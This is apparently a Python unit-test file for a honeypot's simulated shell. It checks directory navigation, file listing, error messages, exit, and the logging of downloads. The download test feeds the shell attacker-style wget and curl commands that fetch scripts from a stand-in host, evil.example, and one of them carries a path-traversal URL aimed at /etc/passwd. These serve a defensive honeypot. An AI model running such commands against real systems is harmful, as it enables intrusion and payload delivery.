from honeypot.shell.fake_shell import FakeShell


def test_pwd_and_cd():
    sh = FakeShell("root")
    assert sh.run("pwd") == "/root\n"
    sh.run("cd /etc")
    assert sh.run("pwd") == "/etc\n"
    sh.run("cd ..")
    assert sh.cwd == "/"


def test_ls_and_cat():
    sh = FakeShell()
    assert "passwd" in sh.run("ls /etc")
    assert sh.run("cat /etc/hostname") == "srv01\n"
    assert ".bash_history" not in sh.run("ls /home/user")
    assert ".bash_history" in sh.run("ls -a /home/user")


def test_errors():
    sh = FakeShell()
    assert "command not found" in sh.run("hack")
    assert "No such file" in sh.run("cat /nope")
    assert "No such file" in sh.run("cd /nope")


def test_download():
    sh = FakeShell()
    out = sh.run("wget http://evil.example/x.sh -O x.sh")
    assert "x.sh saved" in out
    d = sh.downloads[0]
    assert d["url"] == "http://evil.example/x.sh"
    assert d["name"] == "x.sh"
    assert len(d["sha256"]) == 64
    sh.run("curl -O http://evil.example/y.sh")
    assert sh.downloads[1]["name"] == "y.sh"
    sh.run("wget http://evil.example/../../etc/passwd")
    assert sh.downloads[2]["name"] == "passwd"
    

def test_exit():
    sh = FakeShell()
    sh.run("exit")
    assert sh.closed